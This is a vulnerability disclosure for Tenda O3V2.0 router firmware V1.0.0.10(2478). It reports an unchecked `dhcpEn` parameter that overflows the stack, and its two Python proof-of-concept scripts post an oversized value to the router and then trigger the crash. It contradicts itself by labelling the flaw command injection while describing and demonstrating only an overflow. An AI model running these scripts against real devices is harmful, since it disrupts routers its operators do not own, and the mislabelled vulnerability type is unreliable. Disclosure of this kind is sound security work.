## Summary

A stack overflow vulnerability exists in the Tenda O3V2.0 V1.0.0.10(2478) firmware. The `dhcpEn` POST parameter accepted by `/goform/setDhcpConfig` is written to the configuration key `dhcps.en` via `SetValue` without length or content validation. The stored value is later read (via `/goform/getDhcpConfig`) and stored on the stack. Since there is no limit on the length of the stored value, it can lead to stack overflow.

## Affected product & versions

- **Vendor:** Tenda
- **Product:** O3V2.0 (firmware)
- **Affected version:** V1.0.0.10(2478)
- **Download:** https://www.tenda.com.cn/download/detail-2832.html

## Vulnerability type

- **Type:** Command injection (persistent / stored)
- **Root cause:** Missing input validation / insufficient sanitization and lack of length checks in `SetValue` and `GetValue` functions that handle `dhcps.en`.

## Technical details

- The `setDhcpConfig` endpoint accepts a POST parameter `dhcpEn` and calls `SetValue("dhcps.en", Var)` without enforcing a maximum length or sanitizing shell metacharacters.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251011_112937.png)

- The `getDhcpConfig` endpoint reads `dhcpEn` via `GetValue("dhcps.en", v15)` and passes it into a shell-invoking context (or a system call) without sanitization, making stored payloads executed when the endpoint is processed.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251011_113229.png)

Both `SetValue` and `GetValue` lack proper validation of the value contents and length.

## Proof of Concept

1. **Store a malicious `dhcps.en` value**

```python
# poc_set.py
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/setDhcpConfig"
payload =  b"a"*1000

data = {"dhcpEn":payload}
response = requests.post(url, data=data)
print(response.text)
```

2. **Trigger the vulnerable behavior**

```python
# poc_get.py
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/getDhcpConfig"
response = requests.post(url)
print(response.text)
```

3. **Attack result**

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251011_104719.png)